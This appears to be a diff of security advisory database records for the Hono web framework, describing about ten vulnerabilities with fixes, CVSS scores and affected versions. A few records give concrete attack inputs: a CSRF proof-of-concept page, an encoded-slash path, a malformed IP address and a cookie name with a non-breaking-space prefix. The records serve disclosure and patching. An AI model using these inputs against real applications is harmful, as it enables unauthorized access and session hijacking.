+    "details": "### Improper Authorization in Hono (JWT Audience Validation)\n\nHono\u2019s JWT authentication middleware did not validate the `aud` (Audience) claim by default. As a result, applications using the middleware without an explicit audience check could accept tokens intended for other audiences, leading to potential cross-service access (token mix-up).\n\nThe issue is addressed by adding a new `verification.aud` configuration option to allow RFC 7519\u2013compliant audience validation. This change is classified as a **security hardening improvement**, but the lack of validation can still be considered a vulnerability in deployments that rely on default JWT verification.\n\n### Recommended secure configuration\n\nYou can enable RFC 7519\u2013compliant audience validation using the new `verification.aud` option:\n\n```ts\nimport { Hono } from 'hono'\nimport { jwt } from 'hono/jwt'\n\nconst app = new Hono()\n\napp.use(\n  '/api/*',\n  jwt({\n    secret: 'my-secret',\n    verification: {\n      // Require this API to only accept tokens with aud = 'service-a'\n      aud: 'service-a',\n    },\n  })\n)\n```\n\nBelow is the original description by the reporter. For security reasons, it does not include PoC reproduction steps, as the vulnerability can be clearly understood from the technical description.\n\n---\n\n## The original description by the reporter\n\n### Summary\nHono\u2019s **JWT Auth Middleware does not provide a built-in `aud` (Audience) verification option**, which can cause **confused-deputy / token-mix-up** issues: an API may accept a valid token that was **issued for a different audience** (e.g., another service) when multiple services share the same issuer/keys. This can lead to unintended cross-service access. Hono\u2019s docs list verification options for `iss/nbf/iat/exp` only, with **no `aud` support**; RFC 7519 requires that when an `aud` claim is present, tokens **MUST** be rejected unless the processing party identifies itself in that claim.\n\n**Note:** This problem likely exists in the **JWK/JWKS-based middleware** as well (e.g., `jwk` / `verifyWithJwks`)\n\n### Details\n- The middleware\u2019s `verifyOptions` enumerate only `iss`, `nbf`, `iat`, and `exp`; there is **no `aud` option**. The same omission appears in the JWT Helper\u2019s \u201cPayload Validation\u201d list. Developers relying on the middleware for complete standards-aligned validation therefore won\u2019t check audience by default.\n- **Standards requirement:** RFC 7519 \u00a74.1.3 states that each principal intended to process the JWT **MUST** identify itself with a value in the `aud` claim; if it does not, the JWT **MUST** be rejected (when `aud` is present). Lack of a first-class `aud` check increases the risk that tokens issued for **Service B** are accepted by **Service A**.\n- **Real-world effect:** In deployments with a single IdP/JWKS and shared keys across multiple services, a token minted for one audience can be mistakenly accepted by another audience unless developers implement a custom audience check.\n    - For example, with Google Identity (OIDC), iss is always https://accounts.google.com (shared across apps), but aud differs per application because it is that app\u2019s OAuth client ID; therefore, an attacker can host a separate service that supports \u201cSign in with Google,\u201d obtain a valid ID token (JWT) for the victim user, and\u2014if your API does not verify aud\u2014use that token to access your API with the victim\u2019s privileges.\n\n### Impact\n**Type:** Authentication/authorization weakness via **token mix-up (confused-deputy)**.\n\n**Who is impacted:** Any Hono user who:\n- shares an issuer/keys across multiple services (common with a single IdP/JWKS)\n- distinguishes tokens by intended recipient using `aud`.\n\n**What can happen:**\n- **Cross-service access:** A token for *Service B* may be accepted by *Service A*.\n- **Boundary erosion:** ID tokens and access tokens, or separate API audiences, can be inadvertently intermixed.\n    - This may causes unauthorized invocation of sensitive endpoints.\n\n**Recommended remediation:**\n1) Add `verifyOptions.aud` (`string | string[] | RegExp`) to the middleware and enforce RFC 7519 semantics: In [verify method](https://github.com/honojs/hono/blob/db764c2f1d8a2905d66c78c41aa47e47d3a4165d/src/utils/jwt/jwt.ts#L99-L156), if `aud` is present and does not match with specified audiences, reject.\n2) Ensure equivalent `aud` handling exists in the JWK/JWKS flow (`jwk` middleware / `verifyWithJwks`) so users of external IdPs can enforce audience consistently.",
+    "aliases": [
+     "CVE-2025-62610"
+    ],
+    "modified": "2026-09-10T03:50:30.075301408Z",
+    "published": "2025-10-22T15:21:18Z",
+    "database_specific": {
+     "nvd_published_at": "2025-10-22T20:15:38Z",
+     "cwe_ids": [
+      "CWE-285"
+     ],
+     "severity": "HIGH",
+     "github_reviewed": true,
+     "github_reviewed_at": "2025-10-22T15:21:18Z"
+    },
+    "references": [
+     {
+      "type": "WEB",
+      "url": "https://github.com/honojs/hono/security/advisories/GHSA-m732-5p4w-x69g"
+     },
+     {
+      "type": "ADVISORY",
+      "url": "https://nvd.nist.gov/vuln/detail/CVE-2025-62610"
+     },
+     {
+      "type": "WEB",
+      "url": "https://github.com/honojs/hono/commit/45ba3bf9e3dff8e4bd85d6b47d4b71c8d6c66bef"
+     },
+     {
+      "type": "PACKAGE",
+      "url": "https://github.com/honojs/hono"
+     }
+    ],
+    "affected": [
+     {
+      "package": {
+       "name": "hono",
+       "ecosystem": "npm",
+       "purl": "pkg:npm/hono"
+      },
+      "ranges": [
+       {
+        "type": "SEMVER",
+        "events": [
+         {
+          "introduced": "1.1.0"
+         },
+         {
+          "fixed": "4.10.2"
+         }
+        ]
+       }
+      ],
+      "database_specific": {
+       "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2025/10/GHSA-m732-5p4w-x69g/GHSA-m732-5p4w-x69g.json"
+      }
+     }
+    ],
+    "schema_version": "1.9.0",
+    "severity": [
+     {
+      "type": "CVSS_V3",
+      "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:N"
+     }
+    ]
+   },
+   {
+    "id": "GHSA-p6xx-57qc-3wxr",
+    "summary": "Hono Vulnerable to SSE Control Field Injection via CR/LF in writeSSE()",
+    "details": "## Summary\n\nWhen using `streamSSE()` in Streaming Helper, the `event`, `id`, and `retry` fields were not validated for carriage return (`\\r`) or newline (`\\n`) characters.\n\nBecause the SSE protocol uses line breaks as field delimiters, this could allow injection of additional SSE fields within the same event frame if untrusted input was passed into these fields.\n\n## Details\n\nThe SSE helper builds event frames by joining lines with `\\n`. While multi-line `data:` fields are handled according to the SSE specification, the `event`, `id`, and `retry` fields previously allowed raw values without rejecting embedded CR/LF characters.\n\nIncluding CR/LF in these control fields could allow unintended additional fields (such as `data:`, `id:`, or `retry:`) to be injected into the event stream.\n\nThe issue has been fixed by rejecting CR/LF characters in these fields.\n\n## Impact\n\nAn attacker could manipulate the structure of SSE event frames if an application passed user-controlled input directly into `event`, `id`, or `retry`.\n\nDepending on application behavior, this could result in injected SSE fields or altered event stream handling. Applications that render `e.data` in an unsafe manner (for example, using `innerHTML`) could potentially expose themselves to client-side script injection.\n\nThis issue affects applications that rely on the SSE helper to enforce protocol-level constraints.",
+    "aliases": [
+     "CVE-2026-29085"
+    ],
+    "modified": "2026-09-10T03:50:40.157611504Z",
+    "published": "2026-03-04T19:48:41Z",
+    "database_specific": {
+     "severity": "MODERATE",
+     "github_reviewed": true,
+     "github_reviewed_at": "2026-03-04T19:48:41Z",
+     "nvd_published_at": "2026-03-04T23:16:10Z",
+     "cwe_ids": [
+      "CWE-74"
+     ]
+    },
+    "references": [
+     {
+      "type": "WEB",
+      "url": "https://github.com/honojs/hono/security/advisories/GHSA-p6xx-57qc-3wxr"
+     },
+     {
+      "type": "ADVISORY",
+      "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-29085"
+     },
+     {
+      "type": "WEB",
+      "url": "https://github.com/honojs/hono/commit/f4123ed9ea3c7c52380cc99a079a4d773838846e"
+     },
+     {
+      "type": "PACKAGE",
+      "url": "https://github.com/honojs/hono"
+     }
+    ],
+    "affected": [
+     {
+      "package": {
+       "name": "hono",
+       "ecosystem": "npm",
+       "purl": "pkg:npm/hono"
+      },
+      "ranges": [
+       {
+        "type": "SEMVER",
+        "events": [
+         {
+          "introduced": "0"
+         },
+         {
+          "fixed": "4.12.4"
+         }
+        ]
+       }
+      ],
+      "database_specific": {
+       "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/03/GHSA-p6xx-57qc-3wxr/GHSA-p6xx-57qc-3wxr.json"
+      }
+     }
+    ],
+    "schema_version": "1.9.0",
+    "severity": [
+     {
+      "type": "CVSS_V3",
+      "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:N"
+     }
+    ]
+   },
+   {
+    "id": "GHSA-p77w-8qqv-26rm",
+    "summary": "Hono's Cache Middleware ignores Vary: Authorization / Vary: Cookie leading to cross-user cache leakage",
+    "details": "### Summary\n\nCache Middleware does not skip caching for responses that declare per-user variance via `Vary: Authorization` or `Vary: Cookie`. As a result, a response cached for one authenticated user may be served to subsequent requests from different users.\n\n### Details\n\nThe Cache Middleware skips caching when a response carries `Vary: *`, certain `Cache-Control` directives (`private`, `no-store`, `no-cache`), or `Set-Cookie`. However, `Vary: Authorization` and `Vary: Cookie` \u2014 the standard signals defined in RFC 9110 / RFC 9111 to indicate per-user responses \u2014 are not treated as cache-skip reasons.\n\nThis issue arises when applications use the Cache Middleware on endpoints that return user-specific data and rely on `Vary: Authorization` or `Vary: Cookie` to scope the response per user, without also setting `Cache-Control: private`.\n\n### Impact\n\nA user may receive a cached response that was originally generated for a different authenticated user. This may lead to:\n\n- Disclosure of personally identifiable information or other user-specific data present in the response body\n- Inconsistent or incorrect behavior in user-specific endpoints\n\nThis issue affects applications that use the Cache Middleware on endpoints whose responses vary by `Authorization` or `Cookie` and that do not also set `Cache-Control: private`.",
+    "aliases": [
+     "CVE-2026-44457"
+    ],
+    "modified": "2026-09-10T03:51:06.651980667Z",
+    "published": "2026-05-09T00:28:46Z",
+    "database_specific": {
+     "cwe_ids": [
+      "CWE-524"
+     ],
+     "severity": "MODERATE",
+     "github_reviewed": true,
+     "github_reviewed_at": "2026-05-09T00:28:46Z",
+     "nvd_published_at": "2026-05-13T16:16:57Z"
+    },
+    "references": [
+     {
+      "type": "WEB",
+      "url": "https://github.com/honojs/hono/security/advisories/GHSA-p77w-8qqv-26rm"
+     },
+     {
+      "type": "ADVISORY",
+      "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-44457"
+     },
+     {
+      "type": "PACKAGE",
+      "url": "https://github.com/honojs/hono"
+     }
+    ],
+    "affected": [
+     {
+      "package": {
+       "name": "hono",
+       "ecosystem": "npm",
+       "purl": "pkg:npm/hono"
+      },
+      "ranges": [
+       {
+        "type": "SEMVER",
+        "events": [
+         {
+          "introduced": "0"
+         },
+         {
+          "fixed": "4.12.18"
+         }
+        ]
+       }
+      ],
+      "database_specific": {
+       "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/05/GHSA-p77w-8qqv-26rm/GHSA-p77w-8qqv-26rm.json"
+      }
+     }
+    ],
+    "schema_version": "1.9.0",
+    "severity": [
+     {
+      "type": "CVSS_V3",
+      "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N"
+     }
+    ]
+   },
+   {
+    "id": "GHSA-q5qw-h33p-qvwr",
+    "summary": "Hono vulnerable to arbitrary file access via serveStatic vulnerability ",
+    "details": "## Summary\n\nWhen using `serveStatic` together with route-based middleware protections (e.g. `app.use('/admin/*', ...)`), inconsistent URL decoding allowed protected static resources to be accessed without authorization.\n\nThe router used `decodeURI`, while `serveStatic` used `decodeURIComponent`. This mismatch allowed paths containing encoded slashes (`%2F`) to bypass middleware protections while still resolving to the intended filesystem path.\n\n\n## Details\n\nThe routing layer preserved `%2F` as a literal string, while `serveStatic` decoded it into `/` before resolving the file path.\n\nExample:\n\nRequest: `/admin%2Fsecret.html`\n\n- Router sees: `/admin%2Fsecret.html` \u2192 does not match `/admin/*`\n- Static handler resolves: `/admin/secret.html`\n\nAs a result, static files under the configured static root could be served without triggering route-based protections.\n\nThis only affects applications that both:\n\n- Protect subpaths using route-based middleware, and\n- Serve files from the same static root using `serveStatic`.\n\nThis does **not** allow access outside the static root and is **not** a path traversal vulnerability.\n\n\n## Impact\n\nAn unauthenticated attacker could bypass route-based authorization for protected static resources by supplying paths containing encoded slashes.\n\nApplications relying solely on route-based middleware to protect static subpaths may have exposed those resources.",
+    "aliases": [
+     "CVE-2026-29045"
+    ],
+    "modified": "2026-09-10T03:50:40.471950564Z",
+    "published": "2026-03-04T19:48:00Z",
+    "related": [
+     "CVE-2026-6414"
+    ],
+    "database_specific": {
+     "github_reviewed": true,
+     "github_reviewed_at": "2026-03-04T19:48:00Z",
+     "nvd_published_at": "2026-03-04T23:16:10Z",
+     "cwe_ids": [
+      "CWE-177"
+     ],
+     "severity": "HIGH"
+    },
+    "references": [
+     {
+      "type": "WEB",
+      "url": "https://github.com/honojs/hono/security/advisories/GHSA-q5qw-h33p-qvwr"
+     },
+     {
+      "type": "ADVISORY",
+      "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-29045"
+     },
+     {
+      "type": "WEB",
+      "url": "https://github.com/honojs/hono/commit/6a0607a929d888893f0c91d92dce2fcfdb3662a3"
+     },
+     {
+      "type": "PACKAGE",
+      "url": "https://github.com/honojs/hono"
+     }
+    ],
+    "affected": [
+     {
+      "package": {
+       "name": "hono",
+       "ecosystem": "npm",
+       "purl": "pkg:npm/hono"
+      },
+      "ranges": [
+       {
+        "type": "SEMVER",
+        "events": [
+         {
+          "introduced": "0"
+         },
+         {
+          "fixed": "4.12.4"
+         }
+        ]
+       }
+      ],
+      "database_specific": {
+       "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/03/GHSA-q5qw-h33p-qvwr/GHSA-q5qw-h33p-qvwr.json"
+      }
+     }
+    ],
+    "schema_version": "1.9.0",
+    "severity": [
+     {
+      "type": "CVSS_V3",
+      "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N"
+     }
+    ]
+   },
+   {
+    "id": "GHSA-q7jf-gf43-6x6p",
+    "summary": "Hono vulnerable to Vary Header Injection leading to potential CORS Bypass",
+    "details": "### Summary  \nA flaw in the CORS middleware allowed request `Vary` headers to be reflected into the response, enabling attacker-controlled `Vary` values and potentially affecting cache behavior.\n\n### Details  \nThe middleware previously copied the `Vary` header from the request when `origin` was not set to `\"*\"`.  Since `Vary` is a response header that should only be managed by the server, this could allow an attacker to influence caching behavior or cause inconsistent CORS handling.\n\nMost environments will see impact only when shared caches or proxies rely on the `Vary` header. The practical effect varies by configuration.\n\n### Impact  \nMay cause cache key pollution and inconsistent CORS enforcement in certain setups. No direct confidentiality, integrity, or availability impact in default configurations.  \n\n### Resolution  \nUpdate to the latest patched release. The CORS middleware has been corrected to handle `Vary` exclusively as a response header.",
+    "aliases": [
+     "CVE-2025-71381"
+    ],
+    "modified": "2026-10-02T18:45:04.883415459Z",
+    "published": "2025-10-24T19:15:13Z",
+    "database_specific": {
+     "cwe_ids": [
+      "CWE-444"
+     ],
+     "severity": "MODERATE",
+     "github_reviewed": true,
+     "github_reviewed_at": "2025-10-24T19:15:13Z",
+     "nvd_published_at": null
+    },
+    "references": [
+     {
+      "type": "WEB",
+      "url": "https://github.com/honojs/hono/security/advisories/GHSA-q7jf-gf43-6x6p"
+     },
+     {
+      "type": "ADVISORY",
+      "url": "https://nvd.nist.gov/vuln/detail/CVE-2025-71381"
+     },
+     {
+      "type": "WEB",
+      "url": "https://github.com/honojs/hono/commit/d9b8b4b73b4f997994f2764013207365fe711282"
+     },
+     {
+      "type": "PACKAGE",
+      "url": "https://github.com/honojs/hono"
+     },
+     {
+      "type": "WEB",
+      "url": "https://www.vulncheck.com/advisories/hono-vary-header-injection-in-cors-middleware"
+     }
+    ],
+    "affected": [
+     {
+      "package": {
+       "name": "hono",
+       "ecosystem": "npm",
+       "purl": "pkg:npm/hono"
+      },
+      "ranges": [
+       {
+        "type": "SEMVER",
+        "events": [
+         {
+          "introduced": "0"
+         },
+         {
+          "fixed": "4.10.3"
+         }
+        ]
+       }
+      ],
+      "database_specific": {
+       "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2025/10/GHSA-q7jf-gf43-6x6p/GHSA-q7jf-gf43-6x6p.json"
+      }
+     }
+    ],
+    "schema_version": "1.9.0",
+    "severity": [
+     {
+      "type": "CVSS_V3",
+      "score": "CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:U/C:L/I:L/A:N"
+     }
+    ]
+   },
+   {
+    "id": "GHSA-qp7p-654g-cw7p",
+    "summary": "Hono has CSS Declaration Injection via Style Object Values in JSX SSR",
+    "details": "### Summary\n\nThe JSX renderer escapes `style` attribute object values for HTML but not for CSS. Untrusted input in a `style` object value or property name can therefore inject additional CSS declarations into the rendered `style` attribute. The impact is limited to CSS and does not allow JavaScript execution or HTML attribute breakout.\n\n### Details\n\n`style` object values are serialized into a CSS declaration list and escaped for HTML attribute context only. Characters that act as CSS declaration boundaries \u2014 such as `;`, comment markers, quoted strings, and block delimiters \u2014 are valid in HTML attribute content and can extend a value beyond its assigned property.\n\nThis issue arises when untrusted input is interpolated into a JSX `style` object and rendered server-side.\n\n### Impact\n\nAn attacker who can control the value or property name of a `style` object may inject arbitrary CSS declarations. This may lead to:\n\n- Visual manipulation of the page, including full-viewport overlays usable for phishing\n- Outbound requests to attacker-controlled hosts via CSS resource references such as `url(...)`\n- Hijacking of UI affordances through layout, positioning, or visibility changes\n\nThis issue affects applications that render JSX on the server with `style` object values or property names derived from untrusted input.",
+    "aliases": [
+     "CVE-2026-44458"
+    ],
+    "modified": "2026-09-10T03:50:47.323895256Z",
+    "published": "2026-05-09T00:46:44Z",
+    "database_specific": {
+     "severity": "MODERATE",
+     "github_reviewed": true,
+     "github_reviewed_at": "2026-05-09T00:46:44Z",
+     "nvd_published_at": null,
+     "cwe_ids": [
+      "CWE-116",
+      "CWE-74"
+     ]
+    },
+    "references": [
+     {
+      "type": "WEB",
+      "url": "https://github.com/honojs/hono/security/advisories/GHSA-qp7p-654g-cw7p"
+     },
+     {
+      "type": "PACKAGE",
+      "url": "https://github.com/honojs/hono"
+     }
+    ],
+    "affected": [
+     {
+      "package": {
+       "name": "hono",
+       "ecosystem": "npm",
+       "purl": "pkg:npm/hono"
+      },
+      "ranges": [
+       {
+        "type": "SEMVER",
+        "events": [
+         {
+          "introduced": "0"
+         },
+         {
+          "fixed": "4.12.18"
+         }
+        ]
+       }
+      ],
+      "database_specific": {
+       "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/05/GHSA-qp7p-654g-cw7p/GHSA-qp7p-654g-cw7p.json"
+      }
+     }
+    ],
+    "schema_version": "1.9.0",
+    "severity": [
+     {
+      "type": "CVSS_V3",
+      "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:L/A:N"
+     }
+    ]
+   },
+   {
+    "id": "GHSA-r354-f388-2fhh",
+    "summary": "Hono IPv4 address validation bypass in IP Restriction Middleware allows IP spoofing",
+    "details": "## Summary\n\nIP Restriction Middleware in Hono is vulnerable to an IP address validation bypass. The `IPV4_REGEX` pattern and `convertIPv4ToBinary` function in `src/utils/ipaddr.ts` do not properly validate that IPv4 octet values are within the valid range of 0-255, allowing attackers to craft malformed IP addresses that bypass IP-based access controls.\n\n## Details\n\nThe vulnerability exists in two components:\n\n1. **Permissive regex pattern:** The `IPV4_REGEX (/^[0-9]{0,3}\\.[0-9]{0,3}\\.[0-9]{0,3}\\.[0-9]{0,3}$/)` accepts octet values greater than 255 (e.g., `999`).\n2. **Unsafe binary conversion:** The `convertIPv4ToBinary` function does not validate octet ranges before performing bitwise operations. When an octet exceeds 255, it overflows into adjacent octets during the bit-shift calculation.\n\nFor example, the IP address `1.2.2.355` is accepted and converts to the same binary value as 1.2.3.99:\n\n* `355` = `256 + 99` = `0x163`\n* After bit-shifting: `(1 << 24) + (2 << 16) + (2 << 8) + 355` = `0x01020363` = `1.2.3.99`\n\n## Impact\n\nAn attacker can bypass IP-based restrictions by crafting malformed IP addresses:\n\n* **Blocklist bypass:** If `1.2.3.0/24` is blocked, an attacker can use `1.2.2.355` (or similar) to bypass the restriction.\n* **Allowlist bypass:** Requests from unauthorized IP ranges may be incorrectly permitted.\n\nThis is exploitable when the application relies on client-provided IP addresses (e.g., `X-Forwarded-For header`) for access control decisions.\n\n## Affected Components\n\n* IP Restriction Middleware\n* `src/utils/ipaddr.ts`: `IPV4_REGEX`, `convertIPv4ToBinary`, `distinctRemoteAddr`",
+    "aliases": [
+     "CVE-2026-24398"
+    ],
+    "modified": "2026-09-10T03:50:59.119404609Z",
+    "published": "2026-01-27T19:01:43Z",
+    "database_specific": {
+     "github_reviewed_at": "2026-01-27T19:01:43Z",
+     "nvd_published_at": "2026-01-27T19:16:16Z",
+     "cwe_ids": [
+      "CWE-185"
+     ],
+     "severity": "MODERATE",
+     "github_reviewed": true
+    },
+    "references": [
+     {
+      "type": "WEB",
+      "url": "https://github.com/honojs/hono/security/advisories/GHSA-r354-f388-2fhh"
+     },
+     {
+      "type": "ADVISORY",
+      "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-24398"
+     },
+     {
+      "type": "WEB",
+      "url": "https://github.com/honojs/hono/commit/edbf6eea8e6c26a3937518d4ed91d8666edeec37"
+     },
+     {
+      "type": "PACKAGE",
+      "url": "https://github.com/honojs/hono"
+     },
+     {
+      "type": "WEB",
+      "url": "https://github.com/honojs/hono/releases/tag/v4.11.7"
+     }
+    ],
+    "affected": [
+     {
+      "package": {
+       "name": "hono",
+       "ecosystem": "npm",
+       "purl": "pkg:npm/hono"
+      },
+      "ranges": [
+       {
+        "type": "SEMVER",
+        "events": [
+         {
+          "introduced": "0"
+         },
+         {
+          "fixed": "4.11.7"
+         }
+        ]
+       }
+      ],
+      "database_specific": {
+       "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/01/GHSA-r354-f388-2fhh/GHSA-r354-f388-2fhh.json"
+      }
+     }
+    ],
+    "schema_version": "1.9.0",
+    "severity": [
+     {
+      "type": "CVSS_V3",
+      "score": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:L/A:N"
+     }
+    ]
+   },
+   {
+    "id": "GHSA-r5rp-j6wh-rvv4",
+    "summary": "Hono: Non-breaking space prefix bypass in cookie name handling in getCookie()",
+    "details": "## Summary\n\nA discrepancy between browser cookie parsing and `parse()` handling allows cookie prefix protections to be bypassed.\n\nCookie names that are treated as distinct by the browser may be normalized to the same key by `parse()`, allowing attacker-controlled cookies to override legitimate ones.\n\n## Details\n\nBrowsers follow RFC 6265bis and only trim SP (`0x20`) and HTAB (`0x09`) from cookie names. Other characters, such as the non-breaking space (`U+00A0`), are preserved as part of the cookie name.\n\nFor example, the browser treats the following cookies as distinct:\n\n```\n\"dummy-cookie\"\n\"\\u00a0dummy-cookie\"\n```\n\nHowever, `parse()` previously used JavaScript's `trim()`, which removes a broader set of characters including `U+00A0`. As a result, both names are normalized to:\n\n```\n\"dummy-cookie\"\n```\n\nThis mismatch allows attacker-controlled cookies with a `U+00A0` prefix to shadow or override legitimate cookies when accessed via `getCookie()`.\n\n## Impact\n\nAn attacker who can set cookies (e.g., via a man-in-the-middle on a non-secure page or other injection vector) can bypass cookie prefix protections and override sensitive cookies.\n\nThis may lead to:\n\n* Bypassing `__Secure-` and `__Host-` prefix protections\n* Overriding cookies that rely on the Secure attribute\n* Session fixation or session hijacking depending on application usage\n\nThis issue affects applications that rely on `getCookie()` for security-sensitive cookie handling.",
+    "aliases": [
+     "CVE-2026-39410"
+    ],
+    "modified": "2026-09-10T03:51:02.862741526Z",
+    "published": "2026-04-08T00:17:21Z",
+    "database_specific": {
+     "github_reviewed_at": "2026-04-08T00:17:21Z",
+     "nvd_published_at": "2026-04-08T15:16:15Z",
+     "cwe_ids": [
+      "CWE-20"
+     ],
+     "severity": "MODERATE",
+     "github_reviewed": true
+    },
+    "references": [
+     {
+      "type": "WEB",
+      "url": "https://github.com/honojs/hono/security/advisories/GHSA-r5rp-j6wh-rvv4"
+     },
+     {
+      "type": "ADVISORY",
+      "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-39410"
+     },
+     {
+      "type": "WEB",
+      "url": "https://github.com/honojs/hono/commit/cc067c85592415cb1880ad3c61ed923472452ec0"
+     },
+     {
+      "type": "PACKAGE",
+      "url": "https://github.com/honojs/hono"
+     },
+     {
+      "type": "WEB",
+      "url": "https://github.com/honojs/hono/releases/tag/v4.12.12"
+     }
+    ],
+    "affected": [
+     {
+      "package": {
+       "name": "hono",
+       "ecosystem": "npm",
+       "purl": "pkg:npm/hono"
+      },
+      "ranges": [
+       {
+        "type": "SEMVER",
+        "events": [
+         {
+          "introduced": "0"
+         },
+         {
+          "fixed": "4.12.12"
+         }
+        ]
+       }
+      ],
+      "database_specific": {
+       "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/04/GHSA-r5rp-j6wh-rvv4/GHSA-r5rp-j6wh-rvv4.json"
+      }
+     }
+    ],
+    "schema_version": "1.9.0",
+    "severity": [
+     {
+      "type": "CVSS_V3",
+      "score": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:L/A:N"
+     }
+    ]
+   },
+   {
+    "id": "GHSA-rpfr-3m35-5vx5",
+    "summary": "Hono CSRF middleware can be bypassed using crafted Content-Type header",
+    "details": "### Summary\n\nHono CSRF middleware can be bypassed using crafted Content-Type header.\n\n### Details\n\nMIME types are case insensitive, but `isRequestedByFormElementRe` only matches lower-case.\n\nhttps://github.com/honojs/hono/blob/b0af71fbcc6dbe44140ea76f16d68dfdb32a99a0/src/middleware/csrf/index.ts#L16-L17\n\nAs a result, attacker can bypass csrf middleware using upper-case form-like MIME type, such as \"Application/x-www-form-urlencoded\".\n\n### PoC\n\n```html\n<html>\n  <head>\n    <title>CSRF Test</title>\n    <script defer>\n      document.addEventListener(\"DOMContentLoaded\", () => {\n        document.getElementById(\"btn\").addEventListener(\"click\", async () => {\n          const res = await fetch(\"http://victim.example.com/test\", {\n            method: \"POST\",\n            credentials: \"include\",\n            headers: {\n              \"Content-Type\": \"Application/x-www-form-urlencoded\",\n            },\n          });\n        });\n      });\n    </script>\n  </head>\n  <body>\n    <h1>CSRF Test</h1>\n    <button id=\"btn\">Click me!</button>\n  </body>\n</html>\n```\n\n### Impact\n\nBypass csrf protection implemented with hono csrf middleware.\n\n### Discussion\n\nI'm not sure that omitting csrf checks for Simple POST request is a good idea.\nCSRF prevention and CORS are different concepts even though CORS can prevent CSRF in some cases.\n",
+    "aliases": [
+     "CVE-2024-43787"
+    ],
+    "modified": "2026-09-10T03:50:55.380558715Z",
+    "published": "2024-08-22T16:41:08Z",
+    "database_specific": {
+     "github_reviewed_at": "2024-08-22T16:41:08Z",
+     "nvd_published_at": "2024-08-22T15:15:16Z",
+     "cwe_ids": [
+      "CWE-352"
+     ],
+     "severity": "LOW",
+     "github_reviewed": true
+    },
+    "references": [
+     {
+      "type": "WEB",
+      "url": "https://github.com/honojs/hono/security/advisories/GHSA-rpfr-3m35-5vx5"
+     },
+     {
+      "type": "ADVISORY",
+      "url": "https://nvd.nist.gov/vuln/detail/CVE-2024-43787"
+     },
+     {
+      "type": "WEB",
+      "url": "https://github.com/honojs/hono/commit/41ce840379516410dee60c783142e05bb5a22449"
+     },
+     {
+      "type": "PACKAGE",
+      "url": "https://github.com/honojs/hono"
+     },
+     {
+      "type": "WEB",
+      "url": "https://github.com/honojs/hono/blob/b0af71fbcc6dbe44140ea76f16d68dfdb32a99a0/src/middleware/csrf/index.ts#L16-L17"
+     }
+    ],
+    "affected": [
+     {
+      "package": {
+       "name": "hono",
+       "ecosystem": "npm",
+       "purl": "pkg:npm/hono"
+      },
+      "ranges": [
+       {
+        "type": "SEMVER",
+        "events": [
+         {
+          "introduced": "0"
+         },
+         {
+          "fixed": "4.5.8"
+         }
+        ]
+       }
+      ],
+      "database_specific": {
+       "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2024/08/GHSA-rpfr-3m35-5vx5/GHSA-rpfr-3m35-5vx5.json"
+      }
+     }
+    ],
+    "schema_version": "1.9.0",
+    "severity": [
+     {
+      "type": "CVSS_V3",
+      "score": "CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:U/C:L/I:L/A:L"
+     },
+     {
+      "type": "CVSS_V4",
+      "score": "CVSS:4.0/AV:N/AC:L/AT:P/PR:N/UI:P/VC:L/VI:L/VA:L/SC:N/SI:N/SA:N"
+     }
+    ]
+   },
+   {
+    "id": "GHSA-rv63-4mwf-qqc2",
+    "summary": "hono: Body Limit Middleware can be bypassed on AWS Lambda by understating `Content-Length`",
+    "details": "### Summary\n\nThe Body Limit Middleware trusts the request's `Content-Length` header to decide whether a body is within the limit. On AWS Lambda (API Gateway v1/v2, ALB, VPC Lattice, and Lambda@Edge) the body is delivered fully buffered and the adapter builds the request with the client-declared `Content-Length`, which need not match the actual payload. A client can declare a tiny `Content-Length` while sending a much larger body, slipping past the limit.\n\n### Details\n\nWhen `Content-Length` is present and `Transfer-Encoding` is absent, the middleware compares the declared value against the limit and passes the request through if it is small enough. On standards-based runtimes the transport enforces that `Content-Length` matches the body, so this is safe. The Lambda adapters instead reconstruct the request from a buffered payload and copy the client's `Content-Length` verbatim, so the declared length and the real body size are decoupled.\n\nThis issue affects applications deployed on AWS Lambda that rely on the Body Limit Middleware to cap request body size.\n\n### Impact\n\nThe declared body-size limit can be bypassed: a handler reads a payload larger than the configured maximum. Processing the oversized payload (large JSON, multipart, etc.) consumes additional CPU and memory per request. The payload remains bounded by the platform's request size limits, and Lambda isolates invocations, so the impact is increased per-request resource usage rather than full denial of service. This affects applications deployed on AWS Lambda that use the Body Limit Middleware.",
+    "aliases": [
+     "CVE-2026-54288"
+    ],
+    "modified": "2026-09-10T03:50:50.504641908Z",
+    "published": "2026-06-16T14:32:49Z",
+    "database_specific": {
+     "nvd_published_at": "2026-06-22T19:17:19Z",
+     "cwe_ids": [
+      "CWE-345"
+     ],
+     "severity": "MODERATE",
+     "github_reviewed": true,
+     "github_reviewed_at": "2026-06-16T14:32:49Z"
+    },
+    "references": [
+     {
+      "type": "WEB",
+      "url": "https://github.com/honojs/hono/security/advisories/GHSA-rv63-4mwf-qqc2"
+     },
+     {
+      "type": "ADVISORY",
+      "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-54288"
+     },
+     {
